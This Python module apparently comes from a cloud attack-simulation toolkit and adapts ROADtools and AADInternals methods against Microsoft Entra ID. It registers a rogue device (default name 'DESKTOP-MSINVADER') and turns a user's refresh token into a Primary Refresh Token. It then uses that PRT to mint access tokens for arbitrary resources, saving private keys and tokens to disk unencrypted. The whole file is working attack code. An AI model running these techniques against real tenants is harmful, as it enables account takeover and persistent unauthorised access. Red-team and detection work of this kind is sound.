import base64
import json
import logging
import os
import struct
import time
import uuid
from datetime import datetime, timedelta

import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization, padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.kbkdf import KBKDFHMAC, Mode, CounterLocation
from cryptography.hazmat.primitives.asymmetric import padding as apadding
from cryptography.hazmat.primitives.kdf.kbkdf import KBKDFHMAC, Mode, CounterLocation
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes as cipher_modes
import jwt

BCRYPT_RSAPUBLIC_MAGIC = 0x31415352  # 'RSA1'


def _build_transport_key_blob(public_key):
    # DRS expects the TransportKey as a base64 Windows CNG BCRYPT_RSAPUBLIC_BLOB,
    # not a PEM/DER key. AADInternals reuses the device's own key pair for this
    # which is what we do here too.
    # https://github.com/Gerenios/AADInternals/blob/master/PRT_Utils.ps1#L98
    numbers = public_key.public_numbers()
    modulus = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, "big")
    exponent = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, "big")

    header = struct.pack(
        "<6I",
        BCRYPT_RSAPUBLIC_MAGIC,
        len(modulus) * 8,  # BitLength
        len(exponent),     # cbPublicExp
        len(modulus),      # cbModulus
        0,                 # cbPrime1 (unused for public key)
        0,                 # cbPrime2 (unused for public key)
    )
    return base64.b64encode(header + exponent + modulus).decode()


def register_device(auth_config, params, token=False):
    """
    Registers a new device object in Entra ID via the Device Registration Service (DRS)

    Requires an access token scoped for the Device Registration Service
    Based on AADInternals PRT_Utils.ps1 register_device function
	https://github.com/Gerenios/AADInternals/blob/master/PRT_Utils.ps1
    """
    logging.info("Running the register_device technique")

    access_token = token.get("access_token") if token else None
    if not access_token:
        logging.error("A DRS-scoped access token is required to register a device.")
        return

    tenant_domain = params.get("tenant_domain")
    if not tenant_domain:
        logging.error("tenant_domain parameter is required (e.g. contoso.onmicrosoft.com).")
        return

    device_name = params.get("device_name", "DESKTOP-MSINVADER")
    os_version = params.get("os_version", "10.0.19041.928")
    join_type = params.get("join_type", 4)  # 4 = Azure AD register, 0 = Azure AD join

    device_id = str(uuid.uuid4())

    # This key pair is the device's identity going forward - it signs the CSR now
    # and later authenticates PRT requests, so it must be persisted, not discarded.
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    csr = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, device_id)]))
        .sign(private_key, hashes.SHA256())
    )
    csr_b64 = base64.b64encode(csr.public_bytes(serialization.Encoding.DER)).decode()

    url = "https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0"

    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json; charset=utf-8",
    }

    transport_key_b64 = _build_transport_key_blob(private_key.public_key())

    body = {
        "CertificateRequest": {
            "Type": "pkcs10",
            "Data": csr_b64,
        },
        "Attributes": {
            "ReuseDevice": "True",
            "ReturnClientSid": "True",
            "SharedDevice": "False",
        },
        "TransportKey": transport_key_b64,
        "TargetDomain": tenant_domain,
        "DeviceDisplayName": device_name,
        "DeviceType": "Windows",
        "OSVersion": os_version,
        "JoinType": join_type,
    }

    try:
        response = requests.post(url, headers=headers, json=body)
    except Exception as e:
        logging.error(f"Exception during device registration: {e}")
        return

    if response.status_code not in (200, 201):
        logging.error(f"Device registration failed: {response.status_code} {response.text}")
        return

    result = response.json()
    cert_b64 = result.get("Certificate", {}).get("RawBody")
    returned_device_id = result.get("DeviceId", device_id)

    if not cert_b64:
        logging.error(f"Device registration response did not include a certificate: {result}")
        return

    key_path = params.get("key_out", f"{returned_device_id}_device.key")
    cert_path = params.get("cert_out", f"{returned_device_id}_device.p7b")

    with open(key_path, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ))

    with open(cert_path, "wb") as f:
        f.write(base64.b64decode(cert_b64))

    logging.info(f"Registered device '{device_name}' with DeviceId {returned_device_id}")
    logging.info(f"Device private key saved to {key_path}, device certificate saved to {cert_path}")

    return {
        "device_id": returned_device_id,
        "private_key": private_key,
        "certificate_b64": cert_b64,
        "key_path": key_path,
        "cert_path": cert_path,
    }


def request_prt(params):
	"""
	Request a Primary Refresh Token (PRT) using device credentials + refresh token.

	Uses a devices certificate and private key
	plus a user's refresh token to authenticate and obtain a PRT + session key.

	Based on ROADtools deviceauth.py:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py:988

	"""
	logging.info("Running the request_prt technique")

	# Load device credentials
	key_path = params.get("key_path")
	cert_path = params.get("cert_path")
	session = params.get("session", "nosession")
	tenant_id = params.get("tenant_id", "common")
	refresh_token = params.get("refresh_token")

	if not key_path or not cert_path:
		logging.error("key_path and cert_path parameters are required")
		return

	# Load private key
	try:
		with open(key_path, "rb") as f:
			private_key_pem = f.read()
		private_key = serialization.load_pem_private_key(
			private_key_pem,
			password=None,
			backend=default_backend()
		)
	except Exception as e:
		logging.error(f"Failed to load private key from {key_path}: {e}")
		return

	# Load certificate
	try:
		with open(cert_path, "rb") as f:
			cert_data = f.read()
		try:
			certificate = x509.load_der_x509_certificate(cert_data, default_backend())
		except:
			logging.warning("Failed to parse certificate with cryptography, continuing with binary data")
			certificate = None
	except Exception as e:
		logging.error(f"Failed to load certificate from {cert_path}: {e}")
		return

	# Extract device ID from certificate subject
	device_id = None
	if certificate:
		try:
			for attr in certificate.subject:
				if attr.oid == x509.oid.NameOID.COMMON_NAME:
					device_id = attr.value
					break
		except Exception as e:
			logging.warning(f"Failed to extract device ID from certificate: {e}")

	if not device_id:
		logging.error("Could not extract device ID from certificate subject")
		return

	logging.info(f"Using device {device_id} to request PRT")

	# STEP 1: Get nonce via srv_challenge grant type
	# Following ROADtools approach
	logging.debug("Step 1: Requesting nonce via srv_challenge")

	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
	headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	# AAD Broker Plugin client ID
	aad_broker_client_id = "29d9ed98-a469-4536-ade2-f981bc1d605e"

	# Request nonce
	nonce_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": aad_broker_client_id,
	}

	try:
		nonce_response = requests.post(token_endpoint, headers=headers, data=nonce_body, timeout=10)
		if nonce_response.status_code != 200:
			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
			logging.debug(f"Response: {nonce_response.text[:200]}")
			return

		nonce_data = nonce_response.json()
		nonce = nonce_data.get("Nonce")
		if not nonce:
			logging.error(f"No nonce received from srv_challenge")
			return

		logging.debug(f"Nonce obtained: {nonce[:20]}...")

	except Exception as e:
		logging.error(f"Exception during srv_challenge: {e}")
		return

	# STEP 2: Create signed JWT with device certificate
	logging.debug("Step 2: Creating signed JWT with refresh token + device certificate")

	try:
		os_version = "10.0.19041.868"  # Default Windows version

		# JWT payload per ROADtools deviceauth.py:988
		jwt_payload = {
			"client_id": aad_broker_client_id,
			"request_nonce": nonce,
			"scope": "openid aza ugs",
			"group_sids": [],
			"win_ver": os_version,
			"grant_type": "refresh_token",
			"refresh_token": refresh_token,  # User's refresh token - REQUIRED
		}

		# Include certificate in x5c header (base64-encoded, NOT as array for this flow)
		cert_b64 = base64.b64encode(cert_data).decode()

		# Sign JWT with device private key using RS256
		# Per ROADtools: x5c should be the cert, kdf_ver is required
		jwt_token = jwt.encode(
			jwt_payload,
			private_key,
			algorithm="RS256",
			headers={
				"x5c": cert_b64,
				"kdf_ver": 2,
			}
		)

		logging.debug(f"Device JWT created: {jwt_token[:80]}...")

	except Exception as e:
		logging.error(f"Failed to create device JWT: {e}")
		return

	# STEP 3: Submit signed JWT to get PRT
	logging.debug("Step 3: Submitting JWT to obtain PRT (refresh_token upgrade)")

	prt_body = {
		"windows_api_version": "2.2",
		"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
		"request": jwt_token,
		"client_info": "1",
		"tgt": True,
	}

	try:
		prt_response = requests.post(token_endpoint, headers=headers, data=prt_body, timeout=10)
	except Exception as e:
		logging.error(f"Exception during PRT request: {e}")
		return

	# Check response
	if prt_response.status_code not in (200, 201):
		logging.error(f"PRT request failed: {prt_response.status_code}")
		try:
			error_response = prt_response.json()
			logging.error(f"Error: {error_response.get('error')}")
			logging.error(f"Error description: {error_response.get('error_description')}")
			logging.debug(f"Full response: {prt_response.text[:500]}")
		except:
			logging.error(f"Response: {prt_response.text[:200]}")
		return

	try:
		result = prt_response.json()
	except Exception as e:
		logging.error(f"Failed to parse PRT response: {e}")
		return

	# Extract PRT components from response
	session_key_jwe = result.get("session_key_jwe")
	tgt_ad = result.get("tgt_ad")
	tgt_cloud = result.get("tgt_cloud")
	refresh_token = result.get("refresh_token")

	if not session_key_jwe:
		logging.error(f"PRT response did not include session_key_jwe")
		logging.debug(f"Response keys: {list(result.keys())}")
		return

	# Determine output path
	prt_out = params.get("prt_out", f"{device_id}_prt.json")

	# Write PRT components to output file
	try:
		output = {
			"device_id": device_id,
			"session_key_jwe": session_key_jwe,
			"tgt_ad": tgt_ad,
			"tgt_cloud": tgt_cloud,
			"refresh_token": refresh_token,
			"id_token": result.get("id_token"),
			"obtained_at": datetime.utcnow().isoformat(),
			"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
		}

		with open(prt_out, "w") as f:
			json.dump(output, f, indent=2)

		logging.info(f"Successfully obtained PRT for device {device_id}")
		logging.info(f"Session key and TGTs saved to {prt_out}")

		return output

	except Exception as e:
		logging.error(f"Failed to write PRT output to {prt_out}: {e}")
		return

def _calculate_derived_key_v2(session_key, context, jwtbody):
	"""
	Derive a key from PRT session key using context and JWT body.
	Based on ROADtools calculate_derived_key_v2
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/auth.py#L1280
	"""

	digest = hashes.Hash(hashes.SHA256())
	digest.update(context)
	digest.update(jwtbody)
	kdfcontext = digest.finalize()

	label = b"AzureAD-SecureConversation"
	kdf = KBKDFHMAC(
		algorithm=hashes.SHA256(),
		mode=Mode.CounterMode,
		length=32,
		rlen=4,
		llen=4,
		location=CounterLocation.BeforeFixed,
		label=label,
		context=kdfcontext,
		fixed=None,
		backend=default_backend()
	)
	return kdf.derive(session_key)


def _calculate_derived_key_v1(session_key, context):
	"""
	Derive key using v1 (without JWT body).
	Based on ROADtools calculate_derived_key:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/auth.py#L1291
	"""
	

	label = b"AzureAD-SecureConversation"
	kdf = KBKDFHMAC(
		algorithm=hashes.SHA256(),
		mode=Mode.CounterMode,
		length=32,
		rlen=4,
		llen=4,
		location=CounterLocation.BeforeFixed,
		label=label,
		context=context,
		fixed=None,
		backend=default_backend()
	)
	return kdf.derive(session_key)


def _decrypt_response_with_derived_key(encrypted_response, session_key):
	"""
	Decrypt encrypted authentication response (JWE format).
	Handles both AES-256-GCM (12-byte IV) and AES-256-CBC (16-byte IV) based on IV length.
	Based on ROADtools auth.py decrypt_auth_response and decrypt_auth_response_derivedkey:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/auth.py#L1314
	"""
	

	try:
		def b64_decode(data):
			return base64.urlsafe_b64decode(data + ('=' * (len(data) % 4)))

		# Split JWE into 5 parts: header.enckey.iv.ciphertext.authtag
		parts = encrypted_response.split('.')
		if len(parts) != 5:
			logging.error(f"Invalid JWE format: expected 5 parts, got {len(parts)}")
			return None

		header_b64, _, iv_b64, ciphertext_b64, authtag_b64 = parts

		# Parse header and extract context
		header = json.loads(b64_decode(header_b64))
		if 'ctx' not in header:
			logging.error("No 'ctx' in JWE header")
			return None

		context = b64_decode(header['ctx'])
		derived_key = _calculate_derived_key_v1(session_key, context)

		# Decode JWE components
		iv = b64_decode(iv_b64)
		ciphertext = b64_decode(ciphertext_b64)
		authtag = b64_decode(authtag_b64)

		# Decrypt based on IV length
		if len(iv) == 12:
			# AES-256-GCM (12-byte nonce)
			aesgcm = AESGCM(derived_key)
			plaintext = aesgcm.decrypt(iv, ciphertext + authtag, header_b64.encode('utf-8'))
		else:
			# AES-256-CBC with PKCS7 padding (typical for Azure)
			
			cipher = Cipher(algorithms.AES(derived_key), cipher_modes.CBC(iv))
			decryptor = cipher.decryptor()
			decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
			unpadder = padding.PKCS7(128).unpadder()
			plaintext = unpadder.update(decrypted_data) + unpadder.finalize()

		return plaintext.decode('utf-8')

	except Exception as e:
		logging.error(f"Failed to decrypt response: {e}")
		return None


def _decrypt_jwe_with_private_key(jwe_token, private_key):
	"""
	Decrypt JWE session_key using device certificate private key (RSA-OAEP).
	Based on ROADtools decrypt_jwe_with_transport_key:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L757
	"""
	try:
		dataparts = jwe_token.split('.')
		if len(dataparts) < 2:
			logging.error("Invalid JWE format")
			return None

		wrapped_key_b64 = dataparts[1]
		wrapped_key_b64 += '=' * ((4 - len(wrapped_key_b64) % 4) % 4)
		wrapped_key = base64.urlsafe_b64decode(wrapped_key_b64)

		unwrapped_key = private_key.decrypt(
			wrapped_key,
			apadding.OAEP(
				mgf=apadding.MGF1(algorithm=hashes.SHA1()),
				algorithm=hashes.SHA1(),
				label=None
			)
		)
		return unwrapped_key

	except Exception as e:
		logging.error(f"Failed to decrypt JWE: {e}")
		return None


def get_token_with_prt(params):
	"""
	Use a saved PRT to obtain an access token for a specific resource/client.

	This implements the ROADtools aad_brokerplugin_prt_auth pattern:
	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L1037

	1. Load PRT from disk
	2. Decrypt session_key_jwe using device certificate private key
	3. Get nonce from srv_challenge
	4. Create JWT payload signed with derived key
	5. Submit to token endpoint
	6. Decrypt response to extract access token

	Parameters:
		prt_file: Path to saved PRT file (from request_prt)
		key_path: Path to device private key
		cert_path: Path to device certificate
		client_id: Client ID to request token for
		resource: Resource/scope to request access to
		tenant_id: Tenant ID
		token_out: Output file for token (optional)
	"""
	logging.info("Running the get_token_with_prt technique")

	prt_file = params.get("prt_file")
	key_path = params.get("key_path")
	cert_path = params.get("cert_path")
	client_id = params.get("client_id")
	resource = params.get("resource")
	tenant_id = params.get("tenant_id", "common")
	token_out = params.get("token_out", "token_with_prt.json")

	if not all([prt_file, key_path, cert_path, client_id, resource]):
		logging.error("prt_file, key_path, cert_path, client_id, and resource parameters are required")
		return

	# Step 1: Load PRT and device key from disk
	try:
		with open(prt_file, "r") as f:
			prt_data = json.load(f)
		prt = prt_data.get("refresh_token")
		session_key_jwe = prt_data.get("session_key_jwe")

		if not prt or not session_key_jwe:
			logging.error("PRT file missing refresh_token or session_key_jwe")
			return

		logging.info(f"Loaded PRT from {prt_file}")
	except Exception as e:
		logging.error(f"Failed to load PRT: {e}")
		return

	# Load device private key for JWE decryption
	try:
		with open(key_path, "rb") as f:
			private_key_pem = f.read()
		private_key = serialization.load_pem_private_key(
			private_key_pem,
			password=None,
			backend=default_backend()
		)
	except Exception as e:
		logging.error(f"Failed to load device private key: {e}")
		return

	# Step 2: Decrypt session_key_jwe to get the actual session key
	session_key = _decrypt_jwe_with_private_key(session_key_jwe, private_key)
	if not session_key:
		logging.error("Failed to decrypt session key")
		return

	# Step 3: Request nonce from srv_challenge
	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
	headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	nonce_body = {
		"grant_type": "srv_challenge",
		"windows_api_version": "2.0",
		"client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",
	}

	try:
		nonce_response = requests.post(token_endpoint, headers=headers, data=nonce_body, timeout=10)
		if nonce_response.status_code != 200:
			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
			return

		nonce_data = nonce_response.json()
		nonce = nonce_data.get("Nonce")
		if not nonce:
			logging.error("No nonce received")
			return

	except Exception as e:
		logging.error(f"Exception during nonce request: {e}")
		return

	# Step 4: Create JWT payload signed with derived key
	now = int(time.time())
	jwt_payload = {
		"client_id": client_id,
		"request_nonce": nonce,
		"scope": "openid",
		"resource": resource,
		"grant_type": "refresh_token",
		"refresh_token": prt,
		"win_ver": "10.0.19041.868",
		"aud": "login.microsoftonline.com",
		"iss": "aad:brokerplugin",
		"iat": now,
		"exp": now + 3600,
	}

	# Create temp JWT to extract body for KDF
	jwt_context = os.urandom(24)
	headers_for_temp = {
		'ctx': base64.b64encode(jwt_context).decode('utf-8'),
		'kdf_ver': 2
	}

	try:
		temp_jwt = jwt.encode(jwt_payload, os.urandom(32), algorithm='HS256', headers=headers_for_temp)
		jbody = temp_jwt.split('.')[1]
		jwtbody = base64.urlsafe_b64decode(jbody + ('=' * (len(jbody) % 4)))

		derived_key = _calculate_derived_key_v2(session_key, jwt_context, jwtbody)
		request_jwt = jwt.encode(jwt_payload, derived_key, algorithm='HS256', headers=headers_for_temp)

	except Exception as e:
		logging.error(f"Failed to create/sign JWT: {e}")
		return

	# Step 5: Submit signed JWT to token endpoint
	token_body = {
		'windows_api_version': '2.2',
		'grant_type': 'urn:ietf:params:oauth:grant-type:jwt-bearer',
		'request': request_jwt,
		'client_info': '1'
	}

	try:
		token_response = requests.post(token_endpoint, headers=headers, data=token_body, timeout=10)

		if token_response.status_code not in (200, 201):
			logging.error(f"Token request failed: {token_response.status_code}")
			try:
				error_data = token_response.json()
				logging.error(f"Error: {error_data.get('error')}")
				logging.error(f"Description: {error_data.get('error_description')}")
			except:
				logging.error(f"Response: {token_response.text[:200]}")
			return

		response_text = token_response.text

		# Step 6: Decrypt response using session key
		plaintext = _decrypt_response_with_derived_key(response_text, session_key)
		if not plaintext:
			logging.error("Failed to decrypt response")
			return

		# Step 7: Parse decrypted response and extract tokens
		try:
			response_data = json.loads(plaintext)
		except Exception as e:
			logging.error(f"Failed to parse decrypted response as JSON: {e}")
			return

		# Extract tokens from response
		output = {
			"status": "✓ Token request successful",
			"client_id": client_id,
			"resource": resource,
			"response_keys": list(response_data.keys()),
		}

		# Extract access token
		if 'access_token' in response_data:
			output["access_token"] = response_data['access_token']
			logging.info(f"✓ ACCESS TOKEN OBTAINED! Length: {len(response_data['access_token'])} chars")

		# Extract other useful tokens
		for key in ['refresh_token', 'id_token', 'expires_in']:
			if key in response_data:
				if key == 'refresh_token':
					output[key] = response_data[key][:50] + "..." if len(response_data[key]) > 50 else response_data[key]
				else:
					output[key] = response_data[key]

		with open(token_out, "w") as f:
			json.dump(output, f, indent=2)

		logging.info(f"Token response saved to {token_out}")
		logging.info(f"[DETECTION] Used PRT for {client_id} to request {resource}")

		return output

	except Exception as e:
		logging.error(f"Exception during token request: {e}")
		return
